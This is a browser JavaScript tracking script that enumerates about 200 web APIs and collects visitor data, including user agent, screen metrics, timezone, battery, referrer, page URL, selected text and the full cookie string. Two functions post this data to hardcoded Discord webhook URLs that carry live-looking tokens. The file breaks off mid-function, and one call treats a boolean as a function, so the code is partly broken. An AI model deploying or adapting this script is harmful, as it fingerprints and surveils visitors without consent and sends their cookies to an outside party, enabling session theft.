const AVAILABILITY_WEBHOOK_URL = "https://discord.com/api/webhooks/1406107665939042345/s8XXhrjJOdg5xYp4bMx3MsYaMhPpD-AXxnt3uOMUCdIErtabNOP-1BUMDX6Js5gXYK7p";
const FETCHED_INFO_WEBHOOK_URL = "https://discord.com/api/webhooks/1406630620960133162/PVJyUSOX8UflgHk5ZDF-m6LYK__6N2ED0zMN-zoPtgKkKdGbQ9vIopg5huXc0oLRfhmS";
const USER_NAME = "Daddy";

const trackers = [
    {
        category: "Permissions",
        items: [
            { name: "navigator.geolocation.getCurrentPosition", check: () => typeof navigator.geolocation?.getCurrentPosition === "function", fetch: () => navigator.geolocation ? "Geolocation API available" : null },
            { name: "navigator.geolocation.watchPosition", check: () => typeof navigator.geolocation?.watchPosition === "function", fetch: () => navigator.geolocation ? "WatchPosition available" : null },
            { name: "navigator.mediaDevices.getUserMedia", check: () => typeof navigator.mediaDevices?.getUserMedia === "function", fetch: () => navigator.mediaDevices ? "getUserMedia available" : null },
            { name: "navigator.mediaDevices.enumerateDevices", check: () => typeof navigator.mediaDevices?.enumerateDevices === "function", fetch: () => navigator.mediaDevices ? "enumerateDevices available" : null },
            { name: "navigator.mediaDevices.getDisplayMedia", check: () => typeof navigator.mediaDevices?.getDisplayMedia === "function", fetch: () => navigator.mediaDevices ? "getDisplayMedia available" : null },
            { name: "Notification.requestPermission", check: () => typeof Notification?.requestPermission === "function", fetch: () => Notification ? "Notification API available" : null },
            { name: "navigator.credentials.get", check: () => typeof navigator.credentials?.get === "function", fetch: () => navigator.credentials ? "Credentials get available" : null },
            { name: "navigator.credentials.store", check: () => typeof navigator.credentials?.store === "function", fetch: () => navigator.credentials ? "Credentials store available" : null },
            { name: "navigator.permissions.query", check: () => typeof navigator.permissions?.query === "function", fetch: () => navigator.permissions ? "Permissions query available" : null },
            { name: "navigator.clipboard.readText", check: () => typeof navigator.clipboard?.readText === "function", fetch: () => navigator.clipboard ? "Clipboard readText available" : null },
            { name: "navigator.clipboard.read", check: () => typeof navigator.clipboard?.read === "function", fetch: () => navigator.clipboard ? "Clipboard read available" : null },
            { name: "navigator.clipboard.writeText", check: () => typeof navigator.clipboard?.writeText === "function", fetch: () => navigator.clipboard ? "Clipboard writeText available" : null },
            { name: "navigator.clipboard.write", check: () => typeof navigator.clipboard?.write === "function", fetch: () => navigator.clipboard ? "Clipboard write available" : null },
            { name: "navigator.share", check: () => typeof navigator.share === "function", fetch: () => navigator.share ? "Share API available" : null },
            { name: "navigator.canShare", check: () => typeof navigator.canShare === "function", fetch: () => navigator.canShare ? "canShare available" : null },
            { name: "EyeDropper", check: () => typeof EyeDropper === "function", fetch: () => EyeDropper ? "EyeDropper API available" : null },
            { name: "navigator.wakeLock.request", check: () => typeof navigator.wakeLock?.request === "function", fetch: () => navigator.wakeLock ? "WakeLock available" : null },
            { name: "IdleDetector", check: () => typeof IdleDetector === "function", fetch: () => IdleDetector ? "IdleDetector available" : null },
            { name: "PaymentRequest", check: () => typeof PaymentRequest === "function", fetch: () => PaymentRequest ? "PaymentRequest available" : null },
            { name: "navigator.contacts.select", check: () => typeof navigator.contacts?.select === "function", fetch: () => navigator.contacts ? "Contacts select available" : null },
            { name: "navigator.bluetooth.requestDevice", check: () => typeof navigator.bluetooth?.requestDevice === "function", fetch: () => navigator.bluetooth ? "Bluetooth requestDevice available" : null },
            { name: "navigator.usb.requestDevice", check: () => typeof navigator.usb?.requestDevice === "function", fetch: () => navigator.usb ? "USB requestDevice available" : null },
            { name: "navigator.serial.requestPort", check: () => typeof navigator.serial?.requestPort === "function", fetch: () => navigator.serial ? "Serial requestPort available" : null },
            { name: "navigator.hid.requestDevice", check: () => typeof navigator.hid?.requestDevice === "function", fetch: () => navigator.hid ? "HID requestDevice available" : null },
            { name: "navigator.requestMIDIAccess", check: () => typeof navigator.requestMIDIAccess === "function", fetch: () => navigator.requestMIDIAccess ? "MIDI access available" : null },
            { name: "navigator.nfc.watch", check: () => typeof navigator.nfc?.watch === "function", fetch: () => navigator.nfc ? "NFC watch available" : null },
            { name: "window.showOpenFilePicker", check: () => typeof window.showOpenFilePicker === "function", fetch: () => window.showOpenFilePicker ? "OpenFilePicker available" : null },
            { name: "window.showSaveFilePicker", check: () => typeof window.showSaveFilePicker === "function", fetch: () => window.showSaveFilePicker ? "SaveFilePicker available" : null },
            { name: "window.showDirectoryPicker", check: () => typeof window.showDirectoryPicker === "function", fetch: () => window.showDirectoryPicker ? "DirectoryPicker available" : null },
        ]
    },
    {
        category: "Network",
        items: [
            { name: "fetch", check: () => typeof fetch === "function", fetch: () => fetch ? "Fetch API available" : null },
            { name: "navigator.sendBeacon", check: () => typeof navigator.sendBeacon === "function", fetch: () => navigator.sendBeacon ? "SendBeacon available" : null },
            { name: "XMLHttpRequest", check: () => typeof XMLHttpRequest === "function", fetch: () => XMLHttpRequest ? "XMLHttpRequest available" : null },
            { name: "WebSocket", check: () => typeof WebSocket === "function", fetch: () => WebSocket ? "WebSocket available" : null },
            { name: "EventSource", check: () => typeof EventSource === "function", fetch: () => EventSource ? "EventSource available" : null },
            { name: "RTCPeerConnection", check: () => typeof RTCPeerConnection === "function", fetch: () => RTCPeerConnection ? "RTCPeerConnection available" : null },
            { name: "WebTransport", check: () => typeof WebTransport === "function", fetch: () => WebTransport ? "WebTransport available" : null },
        ]
    },
    {
        category: "Fingerprint",
        items: [
            { name: "navigator.userAgent", check: () => typeof navigator.userAgent === "string" && navigator.userAgent.length > 0, fetch: () => navigator.userAgent || null },
            { name: "navigator.userAgentData", check: () => navigator.userAgentData !== undefined, fetch: () => navigator.userAgentData ? JSON.stringify(navigator.userAgentData) : null },
            { name: "navigator.platform", check: () => typeof navigator.platform === "string" && navigator.platform.length > 0, fetch: () => navigator.platform || null },
            { name: "navigator.language", check: () => typeof navigator.language === "string" && navigator.language.length > 0, fetch: () => navigator.language || null },
            { name: "navigator.languages", check: () => Array.isArray(navigator.languages) && navigator.languages.length > 0, fetch: () => navigator.languages ? navigator.languages.join(", ") : null },
            { name: "navigator.hardwareConcurrency", check: () => typeof navigator.hardwareConcurrency === "number" && navigator.hardwareConcurrency > 0, fetch: () => navigator.hardwareConcurrency || null },
            { name: "navigator.deviceMemory", check: () => typeof navigator.deviceMemory === "number" && navigator.deviceMemory > 0, fetch: () => navigator.deviceMemory || null },
            { name: "navigator.maxTouchPoints", check: () => typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints >= 0, fetch: () => navigator.maxTouchPoints || null },
            { name: "navigator.vendor", check: () => typeof navigator.vendor === "string" && navigator.vendor.length > 0, fetch: () => navigator.vendor || null },
            { name: "navigator.product", check: () => typeof navigator.product === "string" && navigator.product.length > 0, fetch: () => navigator.product || null },
            { name: "navigator.webdriver", check: () => navigator.webdriver !== undefined, fetch: () => navigator.webdriver !== undefined ? String(navigator.webdriver) : null },
            { name: "navigator.doNotTrack", check: () => navigator.doNotTrack !== null, fetch: () => navigator.doNotTrack || null },
            { name: "navigator.cookieEnabled", check: () => typeof navigator.cookieEnabled === "boolean", fetch: () => navigator.cookieEnabled ? "Enabled" : "Disabled" },
            { name: "navigator.javaEnabled", check: () => typeof navigator.javaEnabled === "function", fetch: () => navigator.javaEnabled ? "Java enabled" : null },
            { name: "navigator.plugins", check: () => navigator.plugins !== undefined && navigator.plugins.length > 0, fetch: () => navigator.plugins ? navigator.plugins.length + " plugins" : null },
            { name: "navigator.mimeTypes", check: () => navigator.mimeTypes !== undefined && navigator.mimeTypes.length > 0, fetch: () => navigator.mimeTypes ? navigator.mimeTypes.length + " mimeTypes" : null },
            { name: "screen.width", check: () => typeof screen.width === "number" && screen.width > 0, fetch: () => screen.width || null },
            { name: "screen.height", check: () => typeof screen.height === "number" && screen.height > 0, fetch: () => screen.height || null },
            { name: "screen.availWidth", check: () => typeof screen.availWidth === "number" && screen.availWidth > 0, fetch: () => screen.availWidth || null },
            { name: "screen.availHeight", check: () => typeof screen.availHeight === "number" && screen.availHeight > 0, fetch: () => screen.availHeight || null },
            { name: "screen.colorDepth", check: () => typeof screen.colorDepth === "number" && screen.colorDepth > 0, fetch: () => screen.colorDepth || null },
            { name: "screen.pixelDepth", check: () => typeof screen.pixelDepth === "number" && screen.pixelDepth > 0, fetch: () => screen.pixelDepth || null },
            { name: "screen.orientation.type", check: () => typeof screen.orientation?.type === "string" && screen.orientation.type.length > 0, fetch: () => screen.orientation?.type || null },
            { name: "window.devicePixelRatio", check: () => typeof window.devicePixelRatio === "number" && window.devicePixelRatio > 0, fetch: () => window.devicePixelRatio || null },
            { name: "window.innerWidth", check: () => typeof window.innerWidth === "number" && window.innerWidth > 0, fetch: () => window.innerWidth || null },
            { name: "window.innerHeight", check: () => typeof window.innerHeight === "number" && window.innerHeight > 0, fetch: () => window.innerHeight || null },
            { name: "window.outerWidth", check: () => typeof window.outerWidth === "number" && window.outerWidth > 0, fetch: () => window.outerWidth || null },
            { name: "window.outerHeight", check: () => typeof window.outerHeight === "number" && window.outerHeight > 0, fetch: () => window.outerHeight || null },
            { name: "Intl.DateTimeFormat().resolvedOptions().timeZone", check: () => typeof Intl.DateTimeFormat().resolvedOptions().timeZone === "string" && Intl.DateTimeFormat().resolvedOptions().timeZone.length > 0, fetch: () => Intl.DateTimeFormat().resolvedOptions().timeZone || null },
        ]
    },
    {
        category: "Sensors",
        items: [
            { name: "navigator.getBattery", check: () => typeof navigator.getBattery === "function", fetch: async () => { try { const battery = await navigator.getBattery(); return battery ? `Level: ${battery.level}, Charging: ${battery.charging}` : null; } catch (e) { return null; } } },
            { name: "DeviceOrientationEvent", check: () => typeof DeviceOrientationEvent === "function", fetch: () => DeviceOrientationEvent ? "DeviceOrientation available" : null },
            { name: "DeviceMotionEvent", check: () => typeof DeviceMotionEvent === "function", fetch: () => DeviceMotionEvent ? "DeviceMotion available" : null },
            { name: "AbsoluteOrientationSensor", check: () => typeof AbsoluteOrientationSensor === "function", fetch: () => AbsoluteOrientationSensor ? "AbsoluteOrientation available" : null },
            { name: "Accelerometer", check: () => typeof Accelerometer === "function", fetch: () => Accelerometer ? "Accelerometer available" : null },
            { name: "Gyroscope", check: () => typeof Gyroscope === "function", fetch: () => Gyroscope ? "Gyroscope available" : null },
            { name: "Magnetometer", check: () => typeof Magnetometer === "function", fetch: () => Magnetometer ? "Magnetometer available" : null },
            { name: "AmbientLightSensor", check: () => typeof AmbientLightSensor === "function", fetch: () => AmbientLightSensor ? "AmbientLight available" : null },
            { name: "Barometer", check: () => typeof Barometer === "function", fetch: () => Barometer ? "Barometer available" : null },
            { name: "ProximitySensor", check: () => typeof ProximitySensor === "function", fetch: () => ProximitySensor ? "Proximity available" : null },
            { name: "navigator.vibrate", check: () => typeof navigator.vibrate === "function", fetch: () => navigator.vibrate ? "Vibrate available" : null },
        ]
    },
    {
        category: "Graphics",
        items: [
            { name: "canvas.getContext", check: () => typeof HTMLCanvasElement.prototype.getContext === "function", fetch: () => HTMLCanvasElement.prototype.getContext ? "Canvas context available" : null },
            { name: "canvas.toDataURL", check: () => typeof HTMLCanvasElement.prototype.toDataURL === "function", fetch: () => HTMLCanvasElement.prototype.toDataURL ? "toDataURL available" : null },
            { name: "canvas.toBlob", check: () => typeof HTMLCanvasElement.prototype.toBlob === "function", fetch: () => HTMLCanvasElement.prototype.toBlob ? "toBlob available" : null },
            { name: "OffscreenCanvas", check: () => typeof OffscreenCanvas === "function", fetch: () => OffscreenCanvas ? "OffscreenCanvas available" : null },
            { name: "WebGLRenderingContext", check: () => typeof WebGLRenderingContext === "function", fetch: () => WebGLRenderingContext ? "WebGL available" : null },
            { name: "WebGL2RenderingContext", check: () => typeof WebGL2RenderingContext === "function", fetch: () => WebGL2RenderingContext ? "WebGL2 available" : null },
            { name: "navigator.gpu", check: () => navigator.gpu !== undefined, fetch: () => navigator.gpu ? "GPU API available" : null },
        ]
    },
    {
        category: "Storage",
        items: [
            { name: "localStorage", check: () => typeof localStorage === "object" && localStorage !== null, fetch: () => localStorage ? `Items: ${Object.keys(localStorage).length}` : null },
            { name: "sessionStorage", check: () => typeof sessionStorage === "object" && sessionStorage !== null, fetch: () => sessionStorage ? `Items: ${Object.keys(sessionStorage).length}` : null },
            { name: "indexedDB", check: () => typeof indexedDB === "object" && indexedDB !== null, fetch: () => indexedDB ? "IndexedDB available" : null },
            { name: "caches", check: () => typeof caches === "object" && caches !== null, fetch: () => caches ? "Caches available" : null },
            { name: "navigator.storage.estimate", check: () => typeof navigator.storage?.estimate === "function", fetch: async () => { try { const estimate = await navigator.storage.estimate(); return estimate ? `Usage: ${estimate.usage} bytes` : null; } catch (e) { return null; } } },
            { name: "navigator.storage.persist", check: () => typeof navigator.storage?.persist === "function", fetch: () => navigator.storage ? "Storage persist available" : null },
            { name: "document.cookie", check: () => typeof document.cookie === "string" && document.cookie.length > 0, fetch: () => document.cookie || null },
            { name: "document.requestStorageAccess", check: () => typeof document.requestStorageAccess === "function", fetch: () => document.requestStorageAccess ? "Storage access available" : null },
        ]
    },
    {
        category: "Workers",
        items: [
            { name: "Worker", check: () => typeof Worker === "function", fetch: () => Worker ? "Worker API available" : null },
            { name: "SharedWorker", check: () => typeof SharedWorker === "function", fetch: () => SharedWorker ? "SharedWorker available" : null },
            { name: "MessageChannel", check: () => typeof MessageChannel === "function", fetch: () => MessageChannel ? "MessageChannel available" : null },
            { name: "BroadcastChannel", check: () => typeof BroadcastChannel === "function", fetch: () => BroadcastChannel ? "BroadcastChannel available" : null },
        ]
    },
    {
        category: "ServiceWorker",
        items: [
            { name: "navigator.serviceWorker.register", check: () => typeof navigator.serviceWorker?.register === "function", fetch: () => navigator.serviceWorker ? "ServiceWorker register available" : null },
            { name: "navigator.serviceWorker.getRegistrations", check: () => typeof navigator.serviceWorker?.getRegistrations === "function", fetch: () => navigator.serviceWorker ? "getRegistrations available" : null },
            { name: "navigator.serviceWorker.ready", check: () => typeof navigator.serviceWorker?.ready === "object", fetch: () => navigator.serviceWorker.ready ? "ServiceWorker ready" : null },
            { name: "PushManager", check: () => typeof PushManager === "function", fetch: () => PushManager ? "PushManager available" : null },
            { name: "SyncManager", check: () => typeof SyncManager === "function", fetch: () => SyncManager ? "SyncManager available" : null },
            { name: "PeriodicSyncManager", check: () => typeof PeriodicSyncManager === "function", fetch: () => PeriodicSyncManager ? "PeriodicSync available" : null },
        ]
    },
    {
        category: "Media",
        items: [
            { name: "HTMLMediaElement.play", check: () => typeof HTMLMediaElement.prototype.play === "function", fetch: () => HTMLMediaElement.prototype.play ? "Media play available" : null },
            { name: "HTMLMediaElement.pause", check: () => typeof HTMLMediaElement.prototype.pause === "function", fetch: () => HTMLMediaElement.prototype.pause ? "Media pause available" : null },
            { name: "HTMLMediaElement.captureStream", check: () => typeof HTMLMediaElement.prototype.captureStream === "function", fetch: () => HTMLMediaElement.prototype.captureStream ? "captureStream available" : null },
            { name: "MediaRecorder", check: () => typeof MediaRecorder === "function", fetch: () => MediaRecorder ? "MediaRecorder available" : null },
            { name: "MediaStreamTrack.getSettings", check: () => typeof MediaStreamTrack.prototype.getSettings === "function", fetch: () => MediaStreamTrack.prototype.getSettings ? "getSettings available" : null },
            { name: "MediaCapabilities", check: () => typeof navigator.mediaCapabilities === "object" && navigator.mediaCapabilities !== null, fetch: () => navigator.mediaCapabilities ? "MediaCapabilities available" : null },
            { name: "navigator.mediaSession", check: () => typeof navigator.mediaSession === "object" && navigator.mediaSession !== null, fetch: () => navigator.mediaSession ? "MediaSession available" : null },
            { name: "document.pictureInPictureEnabled", check: () => typeof document.pictureInPictureEnabled === "boolean", fetch: () => document.pictureInPictureEnabled ? "PiP enabled" : "PiP disabled" },
            { name: "HTMLVideoElement.requestPictureInPicture", check: () => typeof HTMLVideoElement.prototype.requestPictureInPicture === "function", fetch: () => HTMLVideoElement.prototype.requestPictureInPicture ? "requestPiP available" : null },
            { name: "document.exitPictureInPicture", check: () => typeof document.exitPictureInPicture === "function", fetch: () => document.exitPictureInPicture ? "exitPiP available" : null },
            { name: "navigator.requestMediaKeySystemAccess", check: () => typeof navigator.requestMediaKeySystemAccess === "function", fetch: () => navigator.requestMediaKeySystemAccess ? "MediaKeySystemAccess available" : null },
        ]
    },
    {
        category: "WebCodecs/Streams",
        items: [
            { name: "VideoDecoder", check: () => typeof VideoDecoder === "function", fetch: () => VideoDecoder ? "VideoDecoder available" : null },
            { name: "AudioDecoder", check: () => typeof AudioDecoder === "function", fetch: () => AudioDecoder ? "AudioDecoder available" : null },
            { name: "VideoEncoder", check: () => typeof VideoEncoder === "function", fetch: () => VideoEncoder ? "VideoEncoder available" : null },
            { name: "AudioEncoder", check: () => typeof AudioEncoder === "function", fetch: () => AudioEncoder ? "AudioEncoder available" : null },
            { name: "ImageDecoder", check: () => typeof ImageDecoder === "function", fetch: () => ImageDecoder ? "ImageDecoder available" : null },
            { name: "EncodedVideoChunk", check: () => typeof EncodedVideoChunk === "function", fetch: () => EncodedVideoChunk ? "EncodedVideoChunk available" : null },
            { name: "ReadableStream", check: () => typeof ReadableStream === "function", fetch: () => ReadableStream ? "ReadableStream available" : null },
            { name: "WritableStream", check: () => typeof WritableStream === "function", fetch: () => WritableStream ? "WritableStream available" : null },
            { name: "TransformStream", check: () => typeof TransformStream === "function", fetch: () => TransformStream ? "TransformStream available" : null },
            { name: "CompressionStream", check: () => typeof CompressionStream === "function", fetch: () => CompressionStream ? "CompressionStream available" : null },
            { name: "DecompressionStream", check: () => typeof DecompressionStream === "function", fetch: () => DecompressionStream ? "DecompressionStream available" : null },
        ]
    },
    {
        category: "Observers",
        items: [
            { name: "MutationObserver", check: () => typeof MutationObserver === "function", fetch: () => MutationObserver ? "MutationObserver available" : null },
            { name: "ResizeObserver", check: () => typeof ResizeObserver === "function", fetch: () => ResizeObserver ? "ResizeObserver available" : null },
            { name: "IntersectionObserver", check: () => typeof IntersectionObserver === "function", fetch: () => IntersectionObserver ? "IntersectionObserver available" : null },
            { name: "PerformanceObserver", check: () => typeof PerformanceObserver === "function", fetch: () => PerformanceObserver ? "PerformanceObserver available" : null },
            { name: "performance.now", check: () => typeof performance.now === "function", fetch: () => performance.now ? performance.now() + " ms" : null },
            { name: "performance.timing", check: () => typeof performance.timing === "object" && performance.timing !== null, fetch: () => performance.timing ? "Timing available" : null },
            { name: "performance.getEntries", check: () => typeof performance.getEntries === "function", fetch: () => performance.getEntries ? performance.getEntries().length + " entries" : null },
            { name: "performance.memory", check: () => typeof performance.memory === "object" && performance.memory !== null, fetch: () => performance.memory ? `Used JS Heap: ${performance.memory.usedJSHeapSize} bytes` : null },
            { name: "ReportingObserver", check: () => typeof ReportingObserver === "function", fetch: () => ReportingObserver ? "ReportingObserver available" : null },
        ]
    },
    {
        category: "Window/Doc",
        items: [
            { name: "document.referrer", check: () => typeof document.referrer === "string" && document.referrer.length > 0, fetch: () => document.referrer || null },
            { name: "document.location", check: () => typeof document.location === "object" && document.location !== null, fetch: () => document.location.href || null },
            { name: "document.domain", check: () => typeof document.domain === "string" && document.domain.length > 0, fetch: () => document.domain || null },
            { name: "document.visibilityState", check: () => typeof document.visibilityState === "string" && document.visibilityState.length > 0, fetch: () => document.visibilityState || null },
            { name: "document.hasFocus", check: () => typeof document.hasFocus === "function", fetch: () => document.hasFocus() ? "Has focus" : "No focus" },
            { name: "window.history.length", check: () => typeof window.history.length === "number" && window.history.length >= 0, fetch: () => window.history.length || null },
            { name: "window.history.pushState", check: () => typeof window.history.pushState === "function", fetch: () => window.history.pushState ? "pushState available" : null },
            { name: "window.history.replaceState", check: () => typeof window.history.replaceState === "function", fetch: () => window.history.replaceState ? "replaceState available" : null },
            { name: "window.open", check: () => typeof window.open === "function", fetch: () => window.open ? "open available" : null },
            { name: "window.close", check: () => typeof window.close === "function", fetch: () => window.close ? "close available" : null },
            { name: "window.stop", check: () => typeof window.stop === "function", fetch: () => window.stop ? "stop available" : null },
            { name: "window.focus", check: () => typeof window.focus === "function", fetch: () => window.focus ? "focus available" : null },
            { name: "window.blur", check: () => typeof window.blur === "function", fetch: () => window.blur ? "blur available" : null },
            { name: "window.print", check: () => typeof window.print === "function", fetch: () => window.print ? "print available" : null },
            { name: "window.matchMedia", check: () => typeof window.matchMedia === "function", fetch: () => window.matchMedia ? "matchMedia available" : null },
            { name: "window.getSelection", check: () => typeof window.getSelection === "function", fetch: () => window.getSelection ? window.getSelection().toString() : null },
            { name: "window.name", check: () => typeof window.name === "string" && window.name.length > 0, fetch: () => window.name || null },
        ]
    },
    {
        category: "Display Control",
        items: [
            { name: "Element.requestFullscreen", check: () => typeof Element.prototype.requestFullscreen === "function", fetch: () => Element.prototype.requestFullscreen ? "requestFullscreen available" : null },
            { name: "document.exitFullscreen", check: () => typeof document.exitFullscreen === "function", fetch: () => document.exitFullscreen ? "exitFullscreen available" : null },
            { name: "document.fullscreenElement", check: () => typeof document.fullscreenElement !== "undefined", fetch: () => document.fullscreenElement ? "Fullscreen active" : "No fullscreen" },
            { name: "Element.requestPointerLock", check: () => typeof Element.prototype.requestPointerLock === "function", fetch: () => Element.prototype.requestPointerLock ? "requestPointerLock available" : null },
            { name: "document.exitPointerLock", check: () => typeof document.exitPointerLock === "function", fetch: () => document.exitPointerLock ? "exitPointerLock available" : null },
            { name: "document.pointerLockElement", check: () => typeof document.pointerLockElement !== "undefined", fetch: () => document.pointerLockElement ? "Pointer locked" : "Not locked" },
            { name: "screen.orientation.lock", check: () => typeof screen.orientation?.lock === "function", fetch: () => screen.orientation?.lock ? "orientation lock available" : null },
        ]
    },
    {
        category: "Auth",
        items: [
            { name: "PublicKeyCredential", check: () => typeof PublicKeyCredential === "function", fetch: () => PublicKeyCredential ? "PublicKeyCredential available" : null },
            { name: "navigator.credentials.get({identity})", check: () => typeof navigator.credentials?.get === "function", fetch: () => navigator.credentials ? "Credentials get available" : null },
        ]
    },
    {
        category: "Files",
        items: [
            { name: "FileReader", check: () => typeof FileReader === "function", fetch: () => FileReader ? "FileReader available" : null },
            { name: "DataTransfer", check: () => typeof DataTransfer === "function", fetch: () => DataTransfer ? "DataTransfer available" : null },
            { name: "FileSystemHandle", check: () => typeof FileSystemHandle === "function", fetch: () => FileSystemHandle ? "FileSystemHandle available" : null },
            { name: "FileSystemFileHandle", check: () => typeof FileSystemFileHandle === "function", fetch: () => FileSystemFileHandle ? "FileSystemFileHandle available" : null },
        ]
    },
    {
        category: "Other Devices",
        items: [
            { name: "navigator.getGamepads", check: () => typeof navigator.getGamepads === "function", fetch: () => navigator.getGamepads ? navigator.getGamepads().length + " gamepads" : null },
            { name: "SpeechSynthesisUtterance", check: () => typeof SpeechSynthesisUtterance === "function", fetch: () => SpeechSynthesisUtterance ? "SpeechSynthesis available" : null },
            { name: "speechSynthesis.speak", check: () => typeof speechSynthesis?.speak === "function", fetch: () => speechSynthesis?.speak ? "speak available" : null },
            { name: "SpeechRecognition", check: () => typeof (window.SpeechRecognition || window.webkitSpeechRecognition) === "function", fetch: () => (window.SpeechRecognition || window.webkitSpeechRecognition) ? "SpeechRecognition available" : null },
        ]
    },
    {
        category: "Coordination",
        items: [
            { name: "navigator.locks.request", check: () => typeof navigator.locks?.request === "function", fetch: () => navigator.locks ? "Locks available" : null },
            { name: "Atomics.wait", check: () => typeof Atomics.wait === "function", fetch: () => Atomics.wait ? "Atomics wait available" : null },
            { name: "SharedArrayBuffer", check: () => typeof SharedArrayBuffer === "function", fetch: () => SharedArrayBuffer ? "SharedArrayBuffer available" : null },
        ]
    },
    {
        category: "Presentation/XR",
        items: [
            { name: "PresentationRequest", check: () => typeof PresentationRequest === "function", fetch: () => PresentationRequest ? "PresentationRequest available" : null },
            { name: "navigator.presentation.receiver", check: () => typeof navigator.presentation?.receiver === "object" && navigator.presentation.receiver !== null, fetch: () => navigator.presentation?.receiver ? "Presentation receiver available" : null },
            { name: "navigator.xr.isSessionSupported", check: () => typeof navigator.xr?.isSessionSupported === "function", fetch: () => navigator.xr?.isSessionSupported ? "XR session supported" : null },
            { name: "navigator.xr.requestSession", check: () => typeof navigator.xr?.requestSession === "function", fetch: () => navigator.xr?.requestSession ? "XR requestSession available" : null },
        ]
    },
    {
        category: "URL & Encoding",
        items: [
            { name: "URL.createObjectURL", check: () => typeof URL.createObjectURL === "function", fetch: () => URL.createObjectURL ? "createObjectURL available" : null },
            { name: "URL.revokeObjectURL", check: () => typeof URL.revokeObjectURL === "function", fetch: () => URL.revokeObjectURL ? "revokeObjectURL available" : null },
            { name: "btoa", check: () => typeof btoa === "function", fetch: () => btoa ? "btoa available" : null },
            { name: "atob", check: () => typeof atob === "function", fetch: () => atob ? "atob available" : null },
            { name: "TextEncoder", check: () => typeof TextEncoder === "function", fetch: () => TextEncoder ? "TextEncoder available" : null },
            { name: "TextDecoder", check: () => typeof TextDecoder === "function", fetch: () => TextDecoder ? "TextDecoder available" : null },
        ]
    },
    {
        category: "Scripting",
        items: [
            { name: "eval", check: () => typeof eval === "function", fetch: () => eval ? "eval available" : null },
            { name: "Function", check: () => typeof Function === "function", fetch: () => Function ? "Function available" : null },
            { name: "WebAssembly.instantiate", check: () => typeof WebAssembly.instantiate === "function", fetch: () => WebAssembly.instantiate ? "WebAssembly instantiate available" : null },
            { name: "WebAssembly.compile", check: () => typeof WebAssembly.compile === "function", fetch: () => WebAssembly.compile ? "WebAssembly compile available" : null },
        ]
    },
    {
        category: "EME (DRM)",
        items: [
            { name: "navigator.requestMediaKeySystemAccess", check: () => typeof navigator.requestMediaKeySystemAccess === "function", fetch: () => navigator.requestMediaKeySystemAccess ? "MediaKeySystemAccess available" : null },
            { name: "MediaKeySystemAccess", check: () => typeof MediaKeySystemAccess === "function", fetch: () => MediaKeySystemAccess ? "MediaKeySystemAccess available" : null },
            { name: "HTMLMediaElement.setMediaKeys", check: () => typeof HTMLMediaElement.prototype.setMediaKeys === "function", fetch: () => HTMLMediaElement.prototype.setMediaKeys ? "setMediaKeys available" : null },
        ]
    },
    {
        category: "NetworkInformation",
        items: [
            { name: "navigator.connection.type", check: () => typeof navigator.connection?.type === "string" && navigator.connection.type.length > 0, fetch: () => navigator.connection?.type || null },
            { name: "navigator.connection.effectiveType", check: () => typeof navigator.connection?.effectiveType === "string" && navigator.connection.effectiveType.length > 0, fetch: () => navigator.connection?.effectiveType || null },
            { name: "navigator.connection.downlink", check: () => typeof navigator.connection?.downlink === "number" && navigator.connection.downlink >= 0, fetch: () => navigator.connection?.downlink || null },
            { name: "navigator.connection.rtt", check: () => typeof navigator.connection?.rtt === "number" && navigator.connection.rtt >= 0, fetch: () => navigator.connection?.rtt || null },
            { name: "navigator.connection.saveData", check: () => typeof navigator.connection?.saveData === "boolean", fetch: () => navigator.connection?.saveData ? "SaveData enabled" : "SaveData disabled" },
        ]
    },
    {
        category: "CSS Feature/Fingerprint",
        items: [
            { name: "CSS.supports", check: () => typeof CSS.supports === "function", fetch: () => CSS.supports ? "CSS supports available" : null },
            { name: "matchMedia", check: () => typeof window.matchMedia === "function", fetch: () => window.matchMedia ? "matchMedia available" : null },
        ]
    },
    {
        category: "WebGPU",
        items: [
            { name: "navigator.gpu.requestAdapter", check: () => typeof navigator.gpu?.requestAdapter === "function", fetch: () => navigator.gpu?.requestAdapter ? "GPU requestAdapter available" : null },
            { name: "GPUAdapter.requestDevice", check: () => typeof GPUAdapter?.prototype?.requestDevice === "function", fetch: () => GPUAdapter?.prototype?.requestDevice ? "GPU requestDevice available" : null },
        ]
    },
    {
        category: "Cross-Tab",
        items: [
            { name: "BroadcastChannel", check: () => typeof BroadcastChannel === "function", fetch: () => BroadcastChannel ? "BroadcastChannel available" : null },
            { name: "localStorage", check: () => typeof localStorage === "object" && localStorage !== null, fetch: () => localStorage ? `Items: ${Object.keys(localStorage).length}` : null },
        ]
    },
    {
        category: "Reporting",
        items: [
            { name: "ReportingObserver", check: () => typeof ReportingObserver === "function", fetch: () => ReportingObserver ? "ReportingObserver available" : null },
        ]
    }
];

async function sendAvailabilityToWebhook(category, items) {
    const payload = {
        content: `Browser API Watchlist - ${category} (User: ${USER_NAME})`,
        embeds: [{
            title: `Category: ${category}`,
            description: `Availability status for ${category}`,
            fields: [{
                name: "Data",
                value: `\`\`\`\n${items.map((item, index) => `${index + 1}. ${item.name} - ${item.check() ? "Available" : "Unavailable"}`).join("\n")}\n\`\`\``.slice(0, 2000)
            }]
        }]
    };

    try {
        const response = await fetch(AVAILABILITY_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        if (response.ok) {
            console.log(`Availability for category '${category}' sent to Discord webhook`);
        } else {
            console.error(`Error sending availability for category '${category}': ${response.statusText}`);
        }
    } catch (error) {
        console.error(`Error sending availability for category '${category}': ${error.message}`);
    }
}

async function sendFetchedInfoToWebhook(category, fetchedData) {
    const payload = {
        content: `Browser API Fetched Info - ${category} (User: ${USER_NAME})`,
        embeds: [{
            title: `Category: ${category}`,
            description: `Fetched info for ${category}`,
            fields: [{
                name: "Data",
                value: `\`\`\`\n${fetchedData.filter(d => d.value).map((d, index) => `${index + 1}. ${d.name} - ${d.value}`).join("\n")}\n\`\`\``.slice(0, 2000)
            }]
        }]
    };

    try {
        const response = await fetch(FETCHED_INFO_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        if (response.ok) {
            console.log(`Fetched info for category '${category}' sent to Discord webhook`);
        } else {
            console.error(`Error sending fetched info for category '${category}': ${response.statusText}`);
        }
    } catch (error) {
        console.error(`Error sending fetched info for category '${category}': ${error.message}`);
    }
}

async function checkAndSendTrackers() {
    for (const { category, items } of trackers) {
        const availabilityItems = items.map(item => ({ name: item.name, check: item.check() }));
        await sendAvailabilityToWebhook(category, availabilityItems);

